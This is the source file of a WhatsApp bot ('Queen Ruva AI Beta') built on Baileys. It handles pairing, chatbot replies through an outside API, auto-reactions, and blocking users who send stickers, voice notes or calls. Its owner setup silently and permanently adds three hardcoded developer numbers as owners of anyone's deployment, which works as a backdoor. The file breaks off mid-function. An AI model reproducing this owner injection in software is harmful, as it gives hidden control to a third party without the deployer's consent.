require('./config');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const chalk = require('chalk');
const moment = require('moment-timezone');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const FileType = require('file-type');
const path = require('path');
const axios = require('axios');
const PhoneNumber = require('awesome-phonenumber');
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./database/exifFunct');
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetch, await, sleep, reSize } = require('./database/queenruva');
const { toAudio, toPTT } = require('./database/converter');
const NodeCache = require("node-cache");
const readline = require("readline");
const { parsePhoneNumber } = require("libphonenumber-js");
const { default: makeWASocket, delay, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, Browsers } = require("baileys");

// ========== CONFIGURATION ==========
const ICONIC_TECH = {
    name: "Queen Ruva AI Beta",
    developer: "Iconic Tech",
    website: "https://codewave-unit.zone.id",
    version: "3.2.0",
    theme: {
        primary: '#4F46E5',
        secondary: '#10B981',
        error: '#EF4444',
        warning: '#F59E0B',
        info: '#3B82F6',
        dark: '#1F2937',
        light: '#F3F4F6'
    }
};

// ========== STORE SETUP ==========
const store = {
    messages: {},
    contacts: {},
    chats: {},
    groupMetadata: async (jid) => ({}),
    bind: function(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            messages.forEach(msg => {
                if (msg.key && msg.key.remoteJid) {
                    this.messages[msg.key.remoteJid] = this.messages[msg.key.remoteJid] || {};
                    this.messages[msg.key.remoteJid][msg.key.id] = msg;
                }
            });
        });
        
        ev.on('contacts.update', (contacts) => {
            contacts.forEach(contact => {
                if (contact.id) {
                    this.contacts[contact.id] = contact;
                }
            });
        });
        
        ev.on('chats.set', (chats) => {
            this.chats = chats;
        });
    },
    loadMessage: async (jid, id) => this.messages[jid]?.[id] || null
};

// ========== OWNER CONFIGURATION ==========
let owner = [];
try {
    owner = JSON.parse(fs.readFileSync('./database/json/owner.json'));
    const requiredOwners = ["263783525824", "263714388643", "263786115435"];
    for (const number of requiredOwners) {
        if (!owner.includes(number)) {
            owner.push(number);
        }
    }
    fs.writeFileSync('./database/json/owner.json', JSON.stringify(owner, null, 2));
} catch (err) {
    owner = ["263783525824", "263714388643", "263786115435"];
    fs.writeFileSync('./database/json/owner.json', JSON.stringify(owner, null, 2));
}

// ========== HELPER FUNCTIONS ==========
const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, resolve));
};

const logMessage = (type, message) => {
    const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
    const colors = {
        info: chalk.blue,
        success: chalk.green,
        warning: chalk.yellow,
        error: chalk.red,
        system: chalk.magenta
    };
    
    console.log(colors[type](`[${timestamp}] ${message}`));
};

// ========== MAIN BOT FUNCTION ==========
async function startIconicTechInc() {
    const { state, saveCreds } = await useMultiFileAuthState("session");
    const { version } = await fetchLatestBaileysVersion();
    const credPath = path.join(__dirname, "session", "creds.json");

    // Session management
    if (fs.existsSync(credPath)) {
        try {
            const backupCreds = fs.readFileSync(credPath, "utf8");
            fs.writeFileSync(path.join(__dirname, "session", "creds.json"), backupCreds);
            logMessage('success', '✅ Loaded session from cred.json');
        } catch (err) {
            logMessage('error', `❌ Failed to load cred.json: ${err.message}`);
        }
    } else {
        logMessage('warning', '⚠️ No creds.json found, will require QR scan');
    }

    // Display branding
    console.log(chalk.hex(ICONIC_TECH.theme.primary).bold(`
╔══════════════════════════════════════╗
║           QUEEN RUVA AI BETA         ║
║         DEVELOPED BY ICONIC TECH     ║
╚══════════════════════════════════════╝
    `));
    
    console.log(chalk.hex(ICONIC_TECH.theme.secondary)(`❤️‍🔥 ${ICONIC_TECH.name}`));
    console.log(chalk.hex(ICONIC_TECH.theme.info)(`🌐 ${ICONIC_TECH.website}`));
    console.log(chalk.hex(ICONIC_TECH.theme.warning)(`🤖 Version: ${ICONIC_TECH.version}\n`));

    // Initialize bot
    const IconicTechInc = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        getMessage: async (key) => store.loadMessage(key.remoteJid, key.id) || {}
    });

    store.bind(IconicTechInc.ev);

    // Phone registration if needed
    if (!IconicTechInc.authState.creds.registered) {
        console.log(chalk.hex(ICONIC_TECH.theme.primary)('══════════════════════════════════════════════════'));
        console.log(chalk.hex(ICONIC_TECH.theme.primary)('               PHONE NUMBER VERIFICATION           '));
        console.log(chalk.hex(ICONIC_TECH.theme.primary)('══════════════════════════════════════════════════'));
        
        const phoneNumber = await question('>>> Enter your phone number with country code:\n');
        
        console.log(chalk.hex(ICONIC_TECH.theme.primary)('══════════════════════════════════════════════════'));
        console.log(chalk.hex(ICONIC_TECH.theme.primary)('              GENERATING VERIFICATION CODE        '));
        console.log(chalk.hex(ICONIC_TECH.theme.primary)('══════════════════════════════════════════════════'));
        
        let code = await IconicTechInc.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        
        console.log(chalk.hex(ICONIC_TECH.theme.success)(`
╔══════════════════════════════════════╗
║            VERIFICATION CODE         ║
║               ${code.padEnd(15)}           ║
╚══════════════════════════════════════╝
        `));
        
        console.log(chalk.hex(ICONIC_TECH.theme.info)(`This Bot is Powered By ${ICONIC_TECH.developer}`));
    }
// ========== STICKER BLOCK WITH AUTO-UNBLOCK ==========
IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
    if (!global.stickerBlock) return;

    const mek = chatUpdate.messages[0];
    if (!mek.message || mek.key.fromMe) return;

    try {
        // Check if message is in a group
        const sender = mek.key.remoteJid;
        if (sender.endsWith('@g.us')) return; // ❌ Ignore groups, only DM works

        if (mek.message.stickerMessage) {
            const username = mek.pushName || "User";

            // Send warning + block
            await IconicTechInc.sendMessage(sender, {
                text: `🚫 ${username}, you are blocked for sending stickers.\n\n🤖 You were banned by *Queen Ruva AI Beta*.\n🔄 You will be unblocked automatically after refreshing your behavior.\n\nThanks, ${username} 🙏\n\n💡 Dev: ICONIC TECH`
            });

            await IconicTechInc.updateBlockStatus(sender, 'block');
            logMessage('warn', `Sticker block: Blocked ${sender}`);

            // Schedule unblock after 5 minutes
            setTimeout(async () => {
                try {
                    await IconicTechInc.updateBlockStatus(sender, 'unblock');

                    await IconicTechInc.sendMessage(sender, {
                        text: `✅ Hey ${username}, you are now unblocked by *Queen Ruva AI Beta*.\n\n😊 Your behavior looks good now, try again.\n⚠️ Remember: I will block you again if needed.`
                    });

                    logMessage('info', `Sticker block: Unblocked ${sender} after 5 minutes`);
                } catch (err) {
                    logMessage('error', `Auto-unblock error: ${err}`);
                }
            }, 5 * 60 * 1000); // 5 minutes
        }
    } catch (err) {
        logMessage('error', `Sticker block error: ${err}`);
    }
});
// ========== AUTO BLOCK AUDIO HANDLER ==========
IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
    const m = messages[0];
    if (!m.message || m.key.fromMe) return;

    try {
        // Ignore groups, only act in DM
        if (m.key.remoteJid.endsWith('@g.us')) return;

        // Only apply rule if audioblock is ON
        if (global.audioblock) {
            if (m.message.audioMessage || m.message.ptt) {
                const jid = m.key.remoteJid;

                // Notify user before blocking
                await IconicTechInc.sendMessage(jid, {
                    text: "🚫 You will be blocked for 5 minutes.\n👑 Queen Ruva AI Beta does not allow your dirty voice."
                }, { quoted: m });

                // Block user
                await IconicTechInc.updateBlockStatus(jid, "block");

                // Unblock after 5 minutes
                setTimeout(async () => {
                    await IconicTechInc.updateBlockStatus(jid, "unblock");
                    await IconicTechInc.sendMessage(jid, {
                        text: "✅ You have been unblocked. Please avoid sending audio again. – Queen Ruva AI Beta"
                    });
                }, 5 * 60 * 1000); // 5 minutes
            }
        }
    } catch (err) {
        logMessage('error', `Block/Unblock error: ${err.message}`);
    }
});
// Helper function to check if the bot should respond
function isAllowedChat(mek) {
    const jid = mek.key.remoteJid || "";
    const isGroup = jid.endsWith("@g.us");

    if (isGroup && global.group) return true;      // Allowed in group
    if (!isGroup && global.private) return true;   // Allowed in private
    return false;                                  // Not allowed
}

// ========== MESSAGE PROCESSING ==========
IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
    try {
        const mek = chatUpdate.messages[0];
        if (!mek.message) return;

        // Handle ephemeral messages
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') 
            ? mek.message.ephemeralMessage.message 
            : mek.message;

        if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
        if (!IconicTechInc.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
        if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return;

        // 🚨 Check global private/group settings
        if (!isAllowedChat(mek)) {
            console.log(`❌ Message skipped due to global settings: ${mek.key.remoteJid}`);
            return;
        }

        const m = smsg(IconicTechInc, mek, store);
        require("./queen-ruva")(IconicTechInc, mek, chatUpdate, store);

    } catch (err) {
        logMessage('error', `Message processing error: ${err}`);
    }
});
    // ========== AUTO REACT HANDLER ==========
    IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message || m.key.fromMe) return;
        if (!global.autoreact) return;

        try {
            const emojis = ['🔥', '😂', '❤️', '👍', '😎', '🤖', '✨', '💯'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

            await IconicTechInc.sendMessage(m.key.remoteJid, {
                react: { text: randomEmoji, key: m.key }
            });
        } catch (err) {
            logMessage('error', `Auto-react error: ${err}`);
        }
    });

    // ========== AUDIO RESPONSE HANDLER ==========
    let lastAudioTime = 0;
    const audioDelay = 2000;

    IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message || m.key.fromMe || m.isGroup || !global.chataudio) return;

        try {
            const currentTime = Date.now();
            if (currentTime - lastAudioTime < audioDelay) {
                logMessage('warning', 'Audio rate limit exceeded, skipping message');
                return;
            }

            const text = m.message.conversation || m.message.extendedTextMessage?.text;
            if (!text) return;

            await IconicTechInc.sendMessage(m.key.remoteJid, { 
                react: { text: '🎵', key: m.key } 
            });

            const response = await axios.get('https://apis-keith.vercel.app/ai/blackbox', {
                params: { q: text }
            });

            const aiReply = response.data?.result;
            if (!aiReply) throw new Error("No AI reply generated");

            const lang = 'en';
            const ttsUrls = [
                `https://translate.google.com/translate_tts?ie=UTF-8&tl=${lang}&client=tw-ob&q=${encodeURIComponent(aiReply)}`,
                `https://api.streamelements.com/kappa/v2/speech?voice=Brian&text=${encodeURIComponent(aiReply)}`
            ];

            let audioSent = false;
            for (const url of ttsUrls) {
                try {
                    await IconicTechInc.sendMessage(m.key.remoteJid, {
                        audio: { url },
                        mimetype: 'audio/mpeg',
                    }, { quoted: m });
                    
                    audioSent = true;
                    lastAudioTime = currentTime;
                    break;
                } catch (error) {
                    logMessage('error', `TTS failed for ${url}: ${error.message}`);
                }
            }

            if (!audioSent) {
                await IconicTechInc.sendMessage(m.key.remoteJid, {
                    text: `[Audio Error] Could not generate TTS. Here's the reply:\n\n${aiReply}`
                }, { quoted: m });
            }

        } catch (error) {
            logMessage('error', `Audio bot error: ${error}`);
            await IconicTechInc.sendMessage(m.key.remoteJid, { 
                react: { text: '❌', key: m.key } 
            });
            await IconicTechInc.sendMessage(m.key.remoteJid, {
                text: 'Error: ' + (error.message || 'Failed to process audio.')
            }, { quoted: m });
        }
    });

    // ========== MESSAGE CACHE FOR ANTI-DELETE/EDIT ==========
/* const messageCache = new Map();

// ✅ Store all messages safely
IconicTechInc.ev.on("messages.upsert", async ({ messages }) => {
    for (const msg of messages) {
        if (!msg.key?.remoteJid || !msg.message) continue;
        messageCache.set(msg.key.id, msg);
    }
});

// ✅ Anti-Delete + Anti-Edit
IconicTechInc.ev.on("messages.update", async (updates) => {
    for (const update of updates) {
        try {
            if (!update.key) continue;

            const jid = update.key.remoteJid;
            const msgId = update.key.id;
            const fromUser = update.key.participant || update.key.remoteJid;
            const now = moment().tz("Africa/Harare").format("DD/MM/YYYY, HH:mm:ss");
            const oldMsg = messageCache.get(msgId);

            // 🗑️ Anti Delete
            if (update.update?.message === null && oldMsg) {
                let deletedContent;

                // Catch any type of message (text, image, video, sticker, etc.)
                if (oldMsg.message?.conversation) {
                    deletedContent = oldMsg.message.conversation;
                } else if (oldMsg.message?.extendedTextMessage?.text) {
                    deletedContent = oldMsg.message.extendedTextMessage.text;
                } else if (oldMsg.message?.imageMessage) {
                    deletedContent = "[🖼️ Image]";
                } else if (oldMsg.message?.videoMessage) {
                    deletedContent = "[🎥 Video]";
                } else if (oldMsg.message?.stickerMessage) {
                    deletedContent = "[💠 Sticker]";
                } else if (oldMsg.message?.audioMessage) {
                    deletedContent = "[🎵 Audio]";
                } else if (oldMsg.message?.documentMessage) {
                    deletedContent = `[📄 Document: ${oldMsg.message.documentMessage.fileName}]`;
                } else {
                    deletedContent = "[🔹 Unsupported/Other Message]";
                }

                const boxMsg = 
`╭━━━〔 👑 Queen Ruva AI Beta – Antidelete 〕━━━╮
┃ 👤 User: @${fromUser.split('@')[0]}
┃ 🗑️ Action: Deleted a message
┃ 📝 Content: ${deletedContent}
┃ ⏰ Time: ${now}
┃ 👨‍💻 Dev by ICONIC TECH
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
🌐 Developed by Iconic Tech
🔗 Visit: codewave-unit.zone.id
⚡ Made with Iconic Tech`;

                await IconicTechInc.sendMessage(jid, {
                    text: boxMsg,
                    mentions: [fromUser],
                    contextInfo: {
                        externalAdReply: {
                            title: "Queen Ruva AI Beta",
                            body: "Antidelete | Dev by ICONIC TECH",
                            mediaType: 1,
                            thumbnail: fs.readFileSync("./QueenMedia/bin.jpg"),
                            sourceUrl: global.iconic_channel
                        }
                    }
                });
            }

            // ✍️ Anti Edit
            if (update.update?.message && oldMsg) {
                const oldText = oldMsg.message?.conversation ||
                              oldMsg.message?.extendedTextMessage?.text ||
                              "[non-text message]";

                const newText = update.update.message?.conversation ||
                              update.update.message?.extendedTextMessage?.text ||
                              "[non-text message]";

                if (oldText !== newText) {
                    const boxMsg =
`╭━━━〔 👑 Queen Ruva AI Beta – Antiedit 〕━━━╮
┃ 👤 User: @${fromUser.split('@')[0]}
┃ ✍️ Action: Edited a message
┃ 📝 From: ${oldText}
┃ ➝ To: ${newText}
┃ ⏰ Time: ${now}
┃ 👨‍💻 Dev by ICONIC TECH
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
🌐 Developed by Iconic Tech
🔗 Visit: codewave-unit.zone.id
⚡ Made with Iconic Tech`;

                    await IconicTechInc.sendMessage(jid, {
                        text: boxMsg,
                        mentions: [fromUser],
                        contextInfo: {
                            externalAdReply: {
                                title: "Queen Ruva AI Beta",
                                body: "Anti-edit | Dev by ICONIC TECH",
                                mediaType: 1,
                                thumbnail: fs.readFileSync("./QueenMedia/bin.jpg"),
                                sourceUrl: global.iconic_channel
                            }
                        }
                    });
                }
            }

        } catch (err) {
            console.error("❌ Anti-delete/edit error:", err);
        }
    }
});    */

    // ========== CHATBOT WITH MEMORY ==========
    let lastTextTime = 0;
    const messageDelay = 2000;
    const chatFile = 'chatbot.json';
    let chatData = {};
    const thumbnails = ['./QueenMedia/ai.jpg', './QueenMedia/ai2.jpg'];

    function loadChat() {
        if (fs.existsSync(chatFile)) {
            try {
                chatData = JSON.parse(fs.readFileSync(chatFile, 'utf8'));
            } catch (e) {
                logMessage('error', `Failed to load chat memory: ${e}`);
                chatData = {};
            }
        }
    }

    function saveChat() {
        fs.writeFileSync(chatFile, JSON.stringify(chatData, null, 2));
    }

    loadChat();

    IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message) return;

        if (!m.isGroup && global.chatbot) {
            try {
                const currentTime = Date.now();
                if (currentTime - lastTextTime < messageDelay) {
                    logMessage('warning', 'Message skipped: Rate limit exceeded');
                    return;
                }

                const text = m.message.conversation || m.message.extendedTextMessage?.text;
                if (!text) return;

                const userId = m.key.remoteJid;
                if (!chatData[userId]) chatData[userId] = [];

                chatData[userId].push({ role: 'user', text });
                saveChat();

                await IconicTechInc.sendMessage(m.key.remoteJid, { 
                    react: { text: '⌨️', key: m.key } 
                });

                const context = chatData[userId]
                    .slice(-20)
                    .map(entry => `${entry.role === 'user' ? 'User' : 'AI'}: ${entry.text}`)
                    .join('\n');

                const response = await axios.get('https://apis-keith.vercel.app/ai/grok', {
                    params: { 
                        q: `You are QUEEN RUVA AI, a helpful and friendly chatbot. 
Always reply normally in plain, casual language. 
No roleplay, no Shakespeare, no fancy styles. developed by iconic tech my real mame queen ruva ai beta
Conversation so far:\n${context}\nUser: ${text}\nAI:` 
                    }
                });

                if (response.data?.status && response.data?.result) {
                    const aiReply = response.data.result;

                    chatData[userId].push({ role: 'bot', text: aiReply });
                    saveChat();

                    const thumb = thumbnails[Math.floor(Math.random() * thumbnails.length)];

                    await IconicTechInc.sendMessage(m.key.remoteJid, {
                        image: { url: thumb },
                        caption: `🤖 QUEEN RUVA AI 🤖\n\n${aiReply}\n\nPowered by Iconic Tech`
                    }, { quoted: m });

                    lastTextTime = currentTime;
                } else {
                    throw new Error('Invalid API response');
                }
            } catch (error) {
                logMessage('error', `Chatbot error: ${error}`);
                await IconicTechInc.sendMessage(m.key.remoteJid, { 
                    react: { text: '❌', key: m.key } 
                });

                let errorMessage = 'Sorry, I encountered an error processing your message.';
                if (error.response?.status === 429) {
                    errorMessage = "I'm getting too many requests. Please try again later.";
                }

                await IconicTechInc.sendMessage(m.key.remoteJid, {
                    text: errorMessage
                }, { quoted: m });
            }
        }
    });

    // ========== UTILITY METHODS ==========
    IconicTechInc.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    IconicTechInc.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = IconicTechInc.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    IconicTechInc.getName = async (jid, withoutContact = false) => {
        let id = IconicTechInc.decodeJid(jid);
        withoutContact = IconicTechInc.withoutContact || withoutContact;
        let v;
        
        if (id.endsWith("@g.us")) {
            v = store.contacts[id] || {};
            if (!(v.name || v.subject)) v = await IconicTechInc.groupMetadata(id) || {};
            return v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international');
        } else {
            v = id === '0@s.whatsapp.net' ? {
                id,
                name: 'WhatsApp'
            } : id === IconicTechInc.decodeJid(IconicTechInc.user.id) ?
            IconicTechInc.user :
            (store.contacts[id] || {});
            return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international');
        }
    };

    IconicTechInc.public = true;
    IconicTechInc.serializeM = (m) => smsg(IconicTechInc, m, store);

    // ========== CONNECTION HANDLER ==========
    
IconicTechInc.ev.on("connection.update", async (s) => {
    const { connection, lastDisconnect } = s;

    if (connection === "open") {
        try {
            console.clear();
            console.log(chalk.hex(ICONIC_TECH.theme.primary).bold(`
╔══════════════════════════════════════════════════╗
║                ✅ CONNECTION SUCCESS             ║
║          👑 QUEEN RUVA AI BETA IS ONLINE         ║
╚══════════════════════════════════════════════════╝
            `));

            await delay(1000);

            console.log(chalk.hex(ICONIC_TECH.theme.info).bold(`
╔══════════════════════════════════════════════════╗
║               🔗 CONNECTED USER DETAILS          ║
╚══════════════════════════════════════════════════╝
            `));

            console.log(
                chalk.hex(ICONIC_TECH.theme.success)(
                    JSON.stringify(IconicTechInc.user, null, 2)
                )
            );

            console.log(chalk.hex(ICONIC_TECH.theme.secondary)(`
╔══════════════════════════════════════════════════╗
║                 ⚙️ SYSTEM INFORMATION             ║
╚══════════════════════════════════════════════════╝
            `));

            console.log(chalk.hex(ICONIC_TECH.theme.info)(`🤖 Bot Name: ${ICONIC_TECH.name}`));
            console.log(chalk.hex(ICONIC_TECH.theme.info)(`📦 Version: ${ICONIC_TECH.version}`));
            console.log(chalk.hex(ICONIC_TECH.theme.info)(`👨‍💻 Developer: ${ICONIC_TECH.developer}`));
            console.log(chalk.hex(ICONIC_TECH.theme.info)(`🌐 Website: ${ICONIC_TECH.website}`));

            console.log(chalk.hex(ICONIC_TECH.theme.primary)(`
╔══════════════════════════════════════════════════╗
║            🔮 MULTI-DEVICE PERFECTION            ║
╚══════════════════════════════════════════════════╝
            `));

            // ====== SMART INBOX ONLY TO YOUR NUMBER ======
            const myNumber = "120363301955930948@s.whatsapp.net"; // your JID
            const thumbnails = ["./QueenMedia/welcome.jpg", "./QueenMedia/welcome2.jpg"];
            const thumb = fs.readFileSync(
                thumbnails[Math.floor(Math.random() * thumbnails.length)]
            );

            const now = moment().tz("Africa/Harare");
            const date = now.format("YYYY-MM-DD");
            const time = now.format("HH:mm:ss");

            // Dynamic greeting
            let greeting = "Hello";
            const hour = now.hour();
            if (hour >= 5 && hour < 12) greeting = "Good morning";
            else if (hour >= 12 && hour < 18) greeting = "Good afternoon";
            else greeting = "Good evening";

            // 1️⃣ First Message (text only)
            await IconicTechInc.sendMessage(myNumber, {
                text: `
┌─┈【 👑 QUEEN RUVA AI BETA 】┈─┐
│ ${greeting} @${myNumber.split("@")[0]} 👋
│ Queen Ruva AI Beta is now ONLINE!
│
│ ⚡ System ready for execution...
└─┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┘
👨‍💻 Developed by Iconic Tech
                `.trim(),
                mentions: [myNumber],
            });

            // 2️⃣ Delay 2 seconds
            await delay(2000);

            // 3️⃣ Newsletter Message with Thumbnail
            await IconicTechInc.sendMessage(myNumber, {
                image: thumb,
                caption: `
╭━━〔 🚀 SYSTEM INFORMATION 〕━╮
┃ 🤖 Bot: Queen Ruva AI Beta
┃ 🗄️ Database: QUEEN-RUVA-DB
┃ 📅 Date: ${date}
┃ ⏰ Time: ${time}
┃ ⚡ Status: ACTIVE & OPTIMIZED
╰━━━━━━━━━━━━━━━━━━━━━╯

👨‍💻 Developed by Iconic Tech
🌐 https://codewave-unit.zone.id
                `.trim(),
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "QUEEN RUVA AI",
                        newsletterJid: "120363301955930948@newsletter",
                    },
                },
            });

        } catch (error) {
            logMessage("error", `Connection update error: ${error}`);
        }
    }

    if (connection === "close") {
        if (lastDisconnect?.error?.output?.statusCode !== 401) {
            logMessage("warning", "⚠️ Connection closed. Reconnecting...");
            startIconicTechInc();
        } else {
            logMessage(
                "error",
                "❌ Connection refused due to authentication error. Please check your credentials."
            );
        }
    }
});
    
    IconicTechInc.ev.on('creds.update', saveCreds);

    // ========== MESSAGE SENDING METHODS ==========
    IconicTechInc.sendText = (jid, text, quoted = '', options) => IconicTechInc.sendMessage(jid, {
        text: text,
        ...options
    }, { quoted, ...options });

    IconicTechInc.sendTextWithMentions = async (jid, text, quoted, options = {}) => IconicTechInc.sendMessage(jid, {
        text: text,
        mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'),
        ...options
    }, { quoted });

    IconicTechInc.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : 
                   /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
                   fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer = options && (options.packname || options.author) ? 
                     await writeExifImg(buff, options) : 
                     await imageToWebp(buff);

        await IconicTechInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    IconicTechInc.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : 
                   /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
                   fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer = options && (options.packname || options.author) ? 
                     await writeExifVid(buff, options) : 
                     await videoToWebp(buff);

        await IconicTechInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    IconicTechInc.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };
    
    IconicTechInc.getFile = async (PATH, save) => {
        let res;
        let data = Buffer.isBuffer(PATH) ? PATH : 
                   /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : 
                   fs.existsSync(PATH) ? fs.readFileSync(PATH) : 
                   typeof PATH === 'string' ? PATH : Buffer.alloc(0);
        
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        };
        
        let filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext);
        if (data && save) fs.promises.writeFile(filename, data);
        
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        };
    };

    // ========== ANTI LINK FEATURE ==========
    IconicTechInc.ev.on("messages.upsert", async ({ messages }) => {
        const mek = messages[0];
        if (!mek.message || mek.key.fromMe) return;

        const text = mek.message.conversation || mek.message.extendedTextMessage?.text;
        const chatId = mek.key.remoteJid;

        if (global.antilink && text && chatId.endsWith('@g.us') && text.includes("chat.whatsapp.com")) {
            try {
                await IconicTechInc.sendMessage(chatId, {
                    text: `🚫 *Anti-Link Alert!* \nMessage containing group links was deleted.`
                });

                await IconicTechInc.sendMessage(chatId, { delete: mek.key });
                logMessage('info', `Anti-link: Deleted message from ${mek.key.participant || mek.key.remoteJid}`);
            } catch (err) {
                logMessage('error', `Anti-link error: ${err}`);
            }
        }
    });
// ========== PERMANENT STATUS DISPLAY ==========
const statusDisplay = {
    startTime: Date.now(),
    interval: null,
    
    update() {
        const timestamp = moment().tz("Africa/Harare").format('HH:mm:ss');
        const uptime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;
        
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        
        console.log(chalk.hex('#10B981').bold('👑 QUEEN RUVA AI BETA'));
        console.log(chalk.hex('#F59E0B')('DEVELOPED BY ICONIC TECH'));
        console.log('');
        console.log(chalk.hex('#3B82F6')('🟢 STATUS: ') + chalk.hex('#10B981').bold('ACTIVE'));
        console.log(chalk.hex('#3B82F6')('⏰ RUNTIME: ') + chalk.hex('#F59E0B')(`${hours}h ${minutes}m ${seconds}s`));
        console.log(chalk.hex('#3B82F6')('🕒 TIME: ') + chalk.hex('#10B981')(timestamp));
        console.log('');
        console.log(chalk.hex('#EF4444')('📢 Real-time monitoring • Auto-restart • Multi-device'));
    },
    
    start() {
        this.startTime = Date.now();
        this.update();
        this.interval = setInterval(() => this.update(), 1000);
    }
};

// Start the status display
statusDisplay.start();

// Auto-react to status
    IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
        if (!global.likestatus) return
        const mek = chatUpdate.messages[0]
        if (!mek.message || mek.key.fromMe) return
        const from = mek.key.remoteJid
        const isStatusUpdate = from === 'status@broadcast'
        if (!isStatusUpdate) return

        try {
            await IconicTechInc.readMessages([mek.key])
            const emojis = [
                '❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗',
                '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎',
                '✅', '⚡', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟',
                '🗿', '☠️', '💜', '💙', '🌝', '💚'
            ]
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
            await IconicTechInc.sendMessage(from, {
                react: {
                    text: randomEmoji,
                    key: mek.key,
                }
            }, {
                statusJidList: [mek.key.participant || mek.participant]
            })
            console.log(`Auto-reacted to status update with: ${randomEmoji}`)
        } catch (error) {
            console.error("Error auto-reacting to status:", error)
        }
    })
    // ========== GLOBAL ANTICALL WITH AUTO-UNBLOCK ==========


IconicTechInc.ev.on('call', async (callEvent) => {
    if (!global.anticall) return; // Exit if global anti-call is disabled

    try {
        const call = callEvent[0];
        if (!call || !call.from) return;

        const callerJid = call.from;
        const username = call.displayName || "User";

        // Send warning message before block
        await IconicTechInc.sendMessage(callerJid, {
            text: `🚫 Hello ${username}, you tried to call my boss at work.\n\nYou are now blocked.\n\n📩 You will receive a new message to improve or after my boss at work.\n\nThanks!\nDev by ICONIC TECH\nQueen Ruva AI Beta`
        });

        // Block the caller
        await IconicTechInc.updateBlockStatus(callerJid, 'block');
